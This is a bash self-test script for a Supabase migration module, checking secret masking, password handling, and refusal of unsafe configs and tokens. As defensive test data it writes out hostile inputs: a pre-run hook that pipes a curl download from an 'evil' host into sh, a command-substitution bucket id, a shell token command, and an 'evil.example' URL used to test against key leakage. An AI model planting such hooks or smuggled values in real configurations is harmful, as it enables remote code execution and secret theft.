#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# selftest.sh — OFFLINE checks of the Supabase module's guard-rails. No call to Clever, to
# Supabase nor to the network: fake `clever`, `psql`, `pg_dump`, a local price grid, a trapped
# repository in a temporary folder. Run by <skill>/scripts/selftest.sh (one command for the
# whole skill); can also run alone:
#
#   bash modules/supabase/scripts/selftest.sh          # exit 0 = every check PASS
#
# Covers: syntax (bash -n, /bin/bash -n, Python compilation) of every module file; no
# `python3 -c` / `python3 -` without -I; a trapped repository (json.py, secrets.py, csv.py,
# hashlib.py, re.py…) has no effect; masking (fake JWT, keys) of survey.json through the shared
# masker; the PostgreSQL password never in psql/pg_dump argv, PGPASSFILE 600; measure-cost.sh
# leaves no dump and writes no index on a Supabase host; deploy-target.sh is a dry run by
# default, refuses a wrong token, refuses a trapped bucket id; re-audit cases (UUID bucket and
# policies kept by the masker, OFFLINE grid never approved, .env.target/.clever.json from git
# refused, reserved and command-running names, ceiling off the grid, zone, token_cmd, --keep,
# publish/.gitignore); --help of every script.
# Output lines: "PASS …" / "FAIL …", then "N PASS, M FAIL".
# ---------------------------------------------------------------------------
set -uo pipefail

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  sed -n '3,/^# -----/p' "$0" | sed '$d; s/^# \{0,1\}//'; exit 0
fi
umask 077
MOD="$(cd "$(dirname "$0")/.." && pwd)"
SKILL_ROOT="$(cd "$MOD/../.." && pwd)"
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
PASS=0; FAIL=0
ok()  { PASS=$((PASS + 1)); echo "PASS $1"; }
ko()  { FAIL=$((FAIL + 1)); echo "FAIL $1"; }
check() { local name="$1"; shift; if "$@"; then ok "$name"; else ko "$name"; fi; }   # argv, never eval
json_ok() { python3 -I -m json.tool "$1" >/dev/null 2>&1; }
absent() { ! grep -q -- "$1" "$2" 2>/dev/null; }

# --------------------------------------------------------------------- 1. syntax
while IFS= read -r f; do
  if bash -n "$f" 2>/dev/null && /bin/bash -n "$f" 2>/dev/null; then ok "syntax ${f#$MOD/}"; else ko "syntax ${f#$MOD/}"; fi
done < <(find "$MOD" -name '*.sh' -type f | sort)
while IFS= read -r f; do
  if python3 -I -c 'import sys; compile(open(sys.argv[1]).read(), sys.argv[1], "exec")' "$f"; then
    ok "compile ${f#$MOD/}"; else ko "compile ${f#$MOD/}"; fi
done < <(find "$MOD" -name '*.py' -type f | sort)
while IFS= read -r f; do
  if python3 -I -m json.tool "$f" >/dev/null 2>&1; then ok "json ${f#$MOD/}"; else ko "json ${f#$MOD/}"; fi
done < <(find "$MOD" -name '*.json' -type f | sort)
NO_I="$(grep -rnE 'python3 +(-c|-)( |$)' "$MOD" --include='*.sh' --include='*.md' 2>/dev/null | grep -v 'python3 -I' || true)"
check "python always isolated (-I) for -c and stdin" test -z "$NO_I"
[[ -z "$NO_I" ]] || echo "$NO_I"

# --------------------------------------------------------------------- fake tools
mkdir -p "$T/bin" "$T/state" "$T/repo"
cat > "$T/bin/clever" <<'PY'
#!/usr/bin/env python3
import json, os, sys
E = os.environ["FAKE_STATE"]; a = sys.argv[1:]
open(os.path.join(E, "log"), "a").write(" ".join(a) + "\n")
if a[:3] == ["addon", "providers", "show"]:
    print("Available regions: par, parhds, rbxhds"); print("Plan xxs_sml"); print("  Max connection limit: 45")
elif a[:2] == ["addon", "list"] or a[0] == "curl":
    print("[]")
else:
    sys.exit("fake clever: write refused in the selftest: " + " ".join(a[:2]))
PY
cat > "$T/bin/psql" <<'SH'
#!/bin/bash
printf '%s\n' "$*" >> "$FAKE_STATE/argv"
if [[ -n "${PGPASSFILE:-}" ]]; then
  stat -c '%a' "$PGPASSFILE" 2>/dev/null >> "$FAKE_STATE/modes" || stat -f '%Lp' "$PGPASSFILE" >> "$FAKE_STATE/modes"
fi
case "$*" in
  *server_version_num*) echo 170004 ;;
  *quote_ident\(nspname\)*) echo public ;;
  *pg_database_size*) echo 12345 ;;
  *ivfflat*) echo '[]' ;;
  *) echo null ;;
esac
SH
cat > "$T/bin/pg_dump" <<'SH'
#!/bin/bash
printf '%s\n' "$*" >> "$FAKE_STATE/argv"
[[ "${1:-}" == "--version" ]] && { echo "pg_dump (PostgreSQL) 17.4"; exit 0; }
echo "COPY auth.users (id, email, encrypted_password) FROM stdin;"
SH
chmod +x "$T/bin/"*
cat > "$T/grid.json" <<'EOF'
{"runtime":[{"source":"apps","flavor":"nano","price":"0.0083","time_unit":"PT1H"},{"source":"apps","flavor":"XS","price":"0.0222","time_unit":"PT1H"},{"source":"apps","flavor":"S","price":"0.0444","time_unit":"PT1H"},{"source":"postgresql","flavor":"xxs_sml","price":"0.0073","time_unit":"PT1H"}],"countable":[{"service":"cellar.storage","price_plans":[]}]}
EOF
# Trapped repository: any homonymous import would leave a marker.
cd "$T/repo" && git init -q . 2>/dev/null
for m in json secrets csv hashlib re os sys subprocess urllib; do
  echo "open('$T/TRAP-$m', 'w').write('executed')" > "$m.py"
done
export FAKE_STATE="$T/state" PATH="$T/bin:$PATH" LOC_PRICE_GRID_FILE="$T/grid.json"
export LOC_SELFTEST=1      # the saved grid is accepted with --approve ONLY in the selftest (re-audit M3)
( umask 077; : > "$T/bin/.loc-selftest-fake" )   # honoured only next to the FAKE clever (never with the real clever-tools)

# --------------------------------------------------------------------- 2. masking (shared masker)
JWT="eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.ZmF1c3NlLXNpZ25hdHVyZQ"
python3 -I - "$SKILL_ROOT/scripts/lib" "$JWT" <<'PY' && ok "shared masker: pg_cron Bearer, webhook apikey, sb_secret_, URL password (with quotes), SQL 'Bearer ' || 'x', AWS key, password=; identifiers, UUIDs, ::text casts and sb_publishable_ kept" || ko "shared masker cases"
import sys; sys.path.insert(0, sys.argv[1]); from common import mask_json
jwt = sys.argv[2]
cases = [
    ("select net.http_post(url:='https://x.supabase.co/functions/v1/remind', headers:='{\"Authorization\": \"Bearer %s\"}')" % jwt, [jwt], ["net.http_post", "https://x.supabase.co/functions/v1/remind"]),
    ("EXECUTE FUNCTION supabase_functions.http_request('https://h.example/hook', 'POST', '{\"apikey\":\"%s\"}')" % jwt, [jwt], ["https://h.example/hook"]),
    ("apikey: sb_secret_AbCdEf0123456789xyz", ["AbCdEf0123456789xyz"], ["apikey"]),
    ("postgresql://postgres.abc:Pass2Word!Secret@aws-1-eu-west-1.pooler.supabase.com:5432/postgres", ["Pass2Word!Secret"], ["aws-1-eu-west-1.pooler.supabase.com"]),
    ("headers := jsonb_build_object('Authorization', 'Bearer ' || 'abcdefghijklmnop0123')", ["abcdefghijklmnop0123"], ["Authorization"]),
    ("AKIAABCDEFGHIJKLMNOP and password=hunter2xyz", ["AKIAABCDEFGHIJKLMNOP", "hunter2xyz"], ["password="]),
    ("*/5 * * * *", [], ["*/5 * * * *"]),
    # M1: a quote inside a URL password
    ("dblink('postgresql://u:it's-a-pass@host.supabase.co:5432/db')", ["it's-a-pass"], ["host.supabase.co:5432/db"]),
    ('postgresql://u:pa"ss@host.supabase.co:5432/db', ['pa"ss'], ["host.supabase.co:5432/db"]),
    # M2: identifiers, UUIDs and policy text stay intact (the shape stays, only secrets go)
    ("(auth.role() = 'authenticated'::text)", [], ["(auth.role() = 'authenticated'::text)"]),
    ("allow_authenticated_users_to_read_own_rows", [], ["allow_authenticated_users_to_read_own_rows"]),
    ("public.conversation_participants_history_archive", [], ["public.conversation_participants_history_archive"]),
    ("conversation_participants_conversation_id_fkey FOREIGN KEY (conversation_id)", [], ["conversation_participants_conversation_id_fkey FOREIGN KEY"]),
    ("3f2504e0-4f89-11d3-9a0c-0305e82c3301", [], ["3f2504e0-4f89-11d3-9a0c-0305e82c3301"]),
    # P1: the publishable key is public by design: kept
    ("sb_publishable_AbCdEf0123456789", [], ["sb_publishable_AbCdEf0123456789"]),
]
for text, gone, kept in cases:
    out = mask_json({"k": [text]})["k"][0]
    assert all(g not in out for g in gone) and all(k in out for k in kept), (text, out)
PY
printf 'Below is the result <untrusted-data-1>\n[{"survey":{"method":"MCP","cron_jobs":[{"command":"net.http_post(headers:=%s)"}],"triggers":[{"definition":"apikey: %s"}]}}]\n</untrusted-data-1>\n' \
  "'{\\\"Authorization\\\": \\\"Bearer $JWT\\\"}'" "$JWT" > "$T/mcp-output.txt"
bash "$MOD/scripts/survey-supabase.sh" --extract "$T/mcp-output.txt" > "$T/survey.json" 2>/dev/null
check "--extract: survey.json is valid JSON" json_ok "$T/survey.json"
check "--extract: no JWT in survey.json" absent "eyJ" "$T/survey.json"

# --------------------------------------------------------------------- 3. psql without the password on argv
SUPABASE_DB_URL="postgresql://postgres:S3cr3t-Pw%3Awith%24car@db.example.test:5432/postgres" \
  bash "$MOD/scripts/survey-supabase.sh" > "$T/survey-psql.json" 2>/dev/null
check "psql path: survey.json is valid JSON" json_ok "$T/survey-psql.json"
check "psql path: password absent from psql argv" absent "S3cr3t" "$T/state/argv"
check "psql path: PGPASSFILE is 600" test "$(sort -u "$T/state/modes")" = "600"

SUPABASE_DB_URL="postgresql://postgres:S3cr3t-Pw@db.example.test:5432/postgres" bash "$MOD/scripts/survey-supabase.sh" > /dev/null 2> "$T/sv-nourl.err"
SUPABASE_DB_URL="postgresql://postgres:S3cr3t-Pw@db.example.test:5432/postgres" NEXT_PUBLIC_SUPABASE_URL="http://127.0.0.1:9" NEXT_PUBLIC_SUPABASE_ANON_KEY="anon" \
  bash "$MOD/scripts/survey-supabase.sh" > /dev/null 2> "$T/sv-next.err"
check "survey: null HTTP probes are announced (no URL/key), NEXT_PUBLIC_SUPABASE_URL + _ANON_KEY accepted" \
  test -n "$(grep 'HTTP probes skipped' "$T/sv-nourl.err")" -a -z "$(grep 'HTTP probes skipped' "$T/sv-next.err")"

# M3: the documented way — SUPABASE_DB_URL_FILE, a 600 file outside the repository, read by the script
( umask 077; printf 'postgresql://postgres:F1leS3cret@db.example.test:5432/postgres\n' > "$T/sb-db-url" ); : > "$T/state/argv"
SUPABASE_DB_URL_FILE="$T/sb-db-url" bash "$MOD/scripts/survey-supabase.sh" > "$T/survey-file.json" 2>/dev/null; C1=$?
chmod 644 "$T/sb-db-url"; SUPABASE_DB_URL_FILE="$T/sb-db-url" bash "$MOD/scripts/survey-supabase.sh" > /dev/null 2> "$T/sv-file644.err"; C2=$?
check "M3: SUPABASE_DB_URL_FILE (600) is read by the script, the password never on argv; a file readable by others refused" \
  test "$C1" -eq 0 -a -z "$(grep F1leS3cret "$T/state/argv")" -a "$C2" -ne 0 -a -n "$(grep 'chmod 600' "$T/sv-file644.err")"

# --------------------------------------------------------------------- 4. measure-cost.sh
: > "$T/state/argv"
SUPABASE_DB_URL="postgresql://postgres:S3cr3t-Pw@db.example.test:5432/postgres" \
  bash "$MOD/scripts/measure-cost.sh" > "$T/measures.json" 2>/dev/null
check "measures: valid JSON" json_ok "$T/measures.json"
check "measures: no dump left in the repository" test -z "$(ls "$T/repo" | grep -i dump)"
check "measures: password absent from argv" absent "S3cr3t" "$T/state/argv"
check "measures: no DROP on the source" absent "drop index" "$T/state/argv"
SUPABASE_DB_URL="postgresql://u:p@db.example.test/postgres" bash "$MOD/scripts/measure-cost.sh" --keep "$T/repo/dumps" >/dev/null 2>&1
check "measures: --keep inside a repository is refused" test ! -e "$T/repo/dumps/dump_auth.sql"
TARGET_DB_URL="postgresql://u:p@db.abcd.supabase.co:5432/postgres" bash "$MOD/scripts/measure-cost.sh" --target-index >/dev/null 2>&1; C=$?
check "measures --target-index: a Supabase host is refused" test "$C" -ne 0

# --------------------------------------------------------------------- 5. deploy-target.sh
echo '{"server":{"version":"17.4"},"buckets":[{"id":"avatars"}]}' > survey.json
OUT_D="$(TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json 2>&1)"; C=$?
check "deploy-target dry run: exit 0 and a TOKEN line" test "$C" -eq 0 -a -n "$(printf '%s\n' "$OUT_D" | grep -E '^TOKEN: [0-9a-f]{12}$')"
check "deploy-target dry run: no write asked of clever" test -z "$(grep -E '^(create|addon create|env set|scale|service|link)' "$T/state/log")"
check "deploy-target dry run: price from the shared price.py" test -n "$(printf '%s\n' "$OUT_D" | grep -E 'EUR/h')"
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json --approve 000000000000 >/dev/null 2>&1; C=$?
check "deploy-target: a wrong token is refused (exit 1)" test "$C" -eq 1
echo '{"buckets":[{"id":"x$(touch TRAP-bucket)"}]}' > survey-trap.json
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey-trap.json >/dev/null 2>&1; C=$?
check "deploy-target: a trapped bucket id is refused" test "$C" -ne 0 -a ! -e "$T/repo/TRAP-bucket"

# --------------------------------------------------------------------- 5b. re-audit M2/M3/M4/F5/P5
# M2: a UUID bucket id, through the masker as survey-supabase.sh does it, still reaches deploy-target
printf '{"server":{"version":"17.4"},"buckets":[{"id":"3f2504e0-4f89-11d3-9a0c-0305e82c3301"}],"policies":[{"qual":"(auth.role() = %s::text)"}]}\n' "'authenticated'" \
  | python3 -I "$SKILL_ROOT/scripts/lib/common.py" mask-json > survey-uuid.json
OUT_U="$(TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey-uuid.json 2>&1)"; C=$?
check "M2: masked survey keeps a UUID bucket and 'authenticated'::text; deploy-target accepts it" \
  test "$C" -eq 0 -a -n "$(printf '%s\n' "$OUT_U" | grep 'acme-3f2504e0-4f89-11d3-9a0c-0305e82c3301')" -a -n "$(grep -F "'authenticated'::text" survey-uuid.json)"
# M3: the dry run says OFFLINE; --approve refused outside the selftest
check "M3: dry run on a saved grid labels the price OFFLINE, never 'read live'" \
  test -n "$(printf '%s\n' "$OUT_D" | grep 'OFFLINE saved grid, TESTS ONLY')" -a -z "$(printf '%s\n' "$OUT_D" | grep 'read live')"
TOK="$(printf '%s\n' "$OUT_D" | sed -n 's/^TOKEN: //p')"
OUT_A="$(env -u LOC_SELFTEST TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json --approve "$TOK" 2>&1)"; C=$?
check "M3: --approve refused when LOC_PRICE_GRID_FILE is set (no LOC_SELFTEST)" test "$C" -eq 1 -a -n "$(printf '%s\n' "$OUT_A" | grep 'OFFLINE GRID, tests only')"
# a "real" clever (no selftest marker next to it): the saved grid is refused outright, even for the dry run's token
mkdir -p "$T/realbin"; cp "$T/bin/clever" "$T/realbin/clever"; chmod +x "$T/realbin/clever"
PATH="$T/realbin:$PATH" TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/real-dt.txt" 2>&1; C=$?
check "deploy-target with the real clever on PATH: LOC_PRICE_GRID_FILE refused, no price, no token" test "$C" -eq 2 -a -z "$(grep '^TOKEN:' "$T/real-dt.txt")"
# M4: .env.target / .clever.json from the repository, file mode, reserved and command-running names
printf 'FOO=bar\n' > .env.target; chmod 644 .env.target
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4a.txt" 2>&1; C=$?
check "M4: .env.target readable by others is refused" test "$C" -eq 1 -a -n "$(grep 'chmod 600' "$T/m4a.txt")"
chmod 600 .env.target; git add .env.target 2>/dev/null
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4b.txt" 2>&1; C=$?
check "M4: a .env.target tracked by git is refused" test "$C" -eq 1 -a -n "$(grep 'tracked by git' "$T/m4b.txt")"
git rm -q --cached .env.target 2>/dev/null
printf 'FOO=bar\nPATH=/evil\n' > .env.target
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4c.txt" 2>&1; C=$?
check "M4: a reserved name (PATH) in .env.target is refused" test "$C" -eq 1 -a -n "$(grep 'sets PATH (reserved' "$T/m4c.txt")"
printf 'FOO=bar\nCC_PRE_RUN_HOOK=curl https://x.example/evil | sh\n' > .env.target
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4d.txt" 2>&1; C=$?
check "M4: CC_PRE_RUN_HOOK in .env.target shows an ALERT line, value masked" \
  test "$C" -eq 0 -a -n "$(grep 'ALERT    .env.target sets CC_PRE_RUN_HOOK = \*\*\*' "$T/m4d.txt")" -a -z "$(grep 'x.example' "$T/m4d.txt")"
rm -f .env.target
echo '{"apps":[{"alias":"acme-app","app_id":"app_00000000-0000-0000-0000-000000000001"}]}' > .clever.json
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4e.txt" 2>&1; C=$?
check "M4: a .clever.json entry without org_id is refused" test "$C" -eq 1 -a -n "$(grep 'no org_id' "$T/m4e.txt")"
echo '{"apps":[{"alias":"acme-app","app_id":"app_00000000-0000-0000-0000-000000000001","org_id":"orga_12345678-aaaa-bbbb"}]}' > .clever.json
git add .clever.json 2>/dev/null
TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/m4f.txt" 2>&1; C=$?
check "M4: a .clever.json tracked by git is refused" test "$C" -eq 1 -a -n "$(grep '.clever.json is tracked by git' "$T/m4f.txt")"
git rm -q --cached .clever.json 2>/dev/null; rm -f .clever.json
# F5: ceiling off the grid; zone validated
MAX_FLAVOR=M TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > "$T/f5a.txt" 2>&1
check "F5: an autoscaling ceiling off the grid says NOT IN THE GRID, never 0.0000" \
  test -n "$(grep 'autoscaling ceiling.*NOT IN THE GRID' "$T/f5a.txt")" -a -z "$(grep 'ceiling *0.0000' "$T/f5a.txt")"
ZONE='par&zone_id=x' TRACK=non-hds bash "$MOD/templates/deploy-target.sh" acme orga_12345678-aaaa-bbbb survey.json > /dev/null 2>&1; C=$?
check "F5: a zone outside [a-z0-9-] is refused" test "$C" -eq 1
check "P5: no dead project.postgres fallback" absent 'project") or {}).get("postgres' "$MOD/templates/deploy-target.sh"
# F4: token_cmd runs only as node …/forge-token.mjs, never from a configuration tracked by git
printf '#!/bin/sh\necho fake-token\n' > "$T/bin/node"; chmod +x "$T/bin/node"
mkconf() { printf '{"url":"http://127.0.0.1:9","identities":{"alice":{"token_cmd":"%s","headers":{"Cookie":"sid={token}"}}},"matrix":[{"name":"t","path":"/t","count":"json"}],"expected":{}}' "$1" > "$2"; }
mkconf 'sh -c touch TRAP-tokencmd' check-http.json
python3 -I "$MOD/scripts/check-http.py" check-http.json --read-only > "$T/f4a.txt" 2>&1
check "F4: token_cmd other than node forge-token.mjs is refused (nothing run)" test -n "$(grep 'token_cmd refused: only' "$T/f4a.txt")" -a ! -e TRAP-tokencmd
mkconf 'node scripts/forge-token.mjs alice' check-http.json; git add check-http.json 2>/dev/null
python3 -I "$MOD/scripts/check-http.py" check-http.json --read-only > "$T/f4b.txt" 2>&1
cp check-http.json check-files.json; git add check-files.json 2>/dev/null
python3 -I "$MOD/scripts/check-files.py" check-files.json --no-upload > "$T/f4c.txt" 2>&1
check "F4: token_cmd from a config tracked by git is refused (check-http and check-files)" test -n "$(grep 'is tracked by git' "$T/f4b.txt")" -a -n "$(grep 'is tracked by git' "$T/f4c.txt")"
git rm -q --cached check-http.json check-files.json 2>/dev/null
python3 -I "$MOD/scripts/check-http.py" check-http.json --read-only > "$T/f4d.txt" 2>&1
check "F4: node forge-token.mjs from an untracked config passes the check (reaches the matrix)" test -z "$(grep 'token_cmd refused' "$T/f4d.txt")" -a -n "$(grep '^Matrix' "$T/f4d.txt")"
rm -f check-http.json check-files.json
# F6: --keep checks the target folder's own repository, not the cwd's
mkdir -p "$T/other" && git -C "$T/other" init -q 2>/dev/null
( cd "$T" && SUPABASE_DB_URL="postgresql://u:p@db.example.test/postgres" bash "$MOD/scripts/measure-cost.sh" --keep "$T/other/dumps" ) > "$T/f6.txt" 2>&1; C=$?
check "F6: --keep inside ANOTHER repository (run from outside it) is refused" test "$C" -ne 0 -a -n "$(grep 'inside the repository' "$T/f6.txt")" -a ! -e "$T/other/dumps/dump_auth.sql"
# F3: the public .gitignore covers the module's local outputs (publish/ in the work
# repository, the repository root in the public export: skills/<name>/../../)
GI="$SKILL_ROOT/publish/.gitignore"; [ -f "$GI" ] || GI="$SKILL_ROOT/../../.gitignore"
for pat in .sessions.local.json 'objects*.json' 'check-*.json' 'measures*.json'; do
  check "F3: the public .gitignore ignores $pat" grep -qxF -- "$pat" "$GI"
done

# --------------------------------------------------------------------- 5c. migrate-storage: private bucket needs the secret key (#31/#32/#34)
cat > "$T/fake-storage.py" <<'PY'
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        ok = self.path.startswith("/storage/v1/object/authenticated/") and self.headers.get("apikey") == "sb_secret_selftestkey"
        open(sys.argv[2], "a").write(self.command + " " + self.path + " range=" + str(self.headers.get("Range")) + "\n")
        self.send_response(206 if ok else 400); self.end_headers(); self.wfile.write(b"x" if ok else b'{"error":"not found"}')
    def log_message(self, *a): pass
s = http.server.HTTPServer(("127.0.0.1", 0), H); open(sys.argv[1], "w").write(str(s.server_address[1])); s.serve_forever()
PY
python3 -I "$T/fake-storage.py" "$T/fs.port" "$T/fs.log" & FSPID=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do [ -s "$T/fs.port" ] && break; sleep 0.2; done
echo '[{"bucket":"avatars","name":"u1/a.png","size":1,"mimetype":"image/png"}]' > objects-test.json
printf 'sb_secret_selftestkey\n' > "$T/secret-key"; chmod 600 "$T/secret-key"
NEXT_PUBLIC_SUPABASE_URL="http://127.0.0.1:$(cat "$T/fs.port")" NEXT_PUBLIC_SUPABASE_ANON_KEY="pub-anon" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --source-host 127.0.0.1 > "$T/ms-pub.txt" 2>&1
NEXT_PUBLIC_SUPABASE_URL="http://127.0.0.1:$(cat "$T/fs.port")" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --key-file "$T/secret-key" --source-host 127.0.0.1 > "$T/ms-key.txt" 2>&1
cp "$T/fs.log" "$T/fs-key.log"; : > "$T/fs.log"
NEXT_PUBLIC_SUPABASE_URL="http://127.0.0.1:$(cat "$T/fs.port")" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --key-file "$T/secret-key" > "$T/ms-host.txt" 2>&1; RH=$?
SUPABASE_URL="https://evil.example" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --key-file "$T/secret-key" > "$T/ms-host2.txt" 2>&1; RH2=$?
cp "$T/secret-key" "$T/repo/in-repo-key"; chmod 600 "$T/repo/in-repo-key"
SUPABASE_URL="https://abcdefghijklmnopqrst.supabase.co" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --key-file "$T/repo/in-repo-key" > "$T/ms-inrepo.txt" 2>&1; RIR=$?
rm -f "$T/repo/in-repo-key"
chmod 644 "$T/secret-key"
NEXT_PUBLIC_SUPABASE_URL="http://127.0.0.1:$(cat "$T/fs.port")" \
  python3 -I "$MOD/scripts/migrate-storage.py" objects-test.json --prefix t- --dry-run --key-file "$T/secret-key" --source-host 127.0.0.1 > "$T/ms-perm.txt" 2>&1
kill "$FSPID" 2>/dev/null; wait "$FSPID" 2>/dev/null
check "migrate-storage dry run: NEXT_PUBLIC_* names accepted; a private bucket with the public key says the secret key is BLOCKING" \
  test -n "$(grep 'read route for avatars: NONE answers.*SECRET key.*BLOCKING' "$T/ms-pub.txt")"
check "migrate-storage dry run: --key-file (600) opens the authenticated route, byte 0 only, nothing written, key never printed" \
  test -n "$(grep 'read route for avatars: authenticated answers.*--key-file' "$T/ms-key.txt")" -a -z "$(grep -h selftestkey "$T/ms-key.txt" "$T/ms-pub.txt")" -a -n "$(grep 'range=bytes=0-0' "$T/fs-key.log")" -a ! -e storage-manifest.json
check "migrate-storage: a --key-file readable by others is refused" test -n "$(grep 'chmod 600' "$T/ms-perm.txt")"
check "M1: the secret key is never sent to a host that is not <ref>.supabase.co nor --source-host (nothing reached the server, canary absent)" \
  test "$RH" -ne 0 -a "$RH2" -ne 0 -a ! -s "$T/fs.log" -a -n "$(grep 'Nothing was sent' "$T/ms-host.txt")" -a -n "$(grep 'Nothing was sent' "$T/ms-host2.txt")" -a -z "$(grep -h selftestkey "$T/ms-host.txt" "$T/ms-host2.txt")"
check "F5: a --key-file inside the repository is refused even when untracked" test "$RIR" -ne 0 -a -n "$(grep 'inside the repository' "$T/ms-inrepo.txt")"
rm -f objects-test.json

# --------------------------------------------------------------------- 6. --help
for s in scripts/survey-supabase.sh scripts/measure-cost.sh scripts/selftest.sh templates/deploy-target.sh; do
  bash "$MOD/$s" --help >/dev/null 2>&1 && ok "--help $s" || ko "--help $s"
done
for s in "$MOD"/scripts/*.py; do
  python3 -I "$s" --help >/dev/null 2>&1 && ok "--help scripts/${s##*/}" || ko "--help scripts/${s##*/}"
done

# --------------------------------------------------------------------- 7. trapped repository
TRAPS="$(ls "$T" | grep '^TRAP-' || true)"
check "trapped repository: no homonymous module executed" test -z "$TRAPS"
[[ -z "$TRAPS" ]] || echo "$TRAPS"

echo
echo "$PASS PASS, $FAIL FAIL"
[[ $FAIL -eq 0 ]]
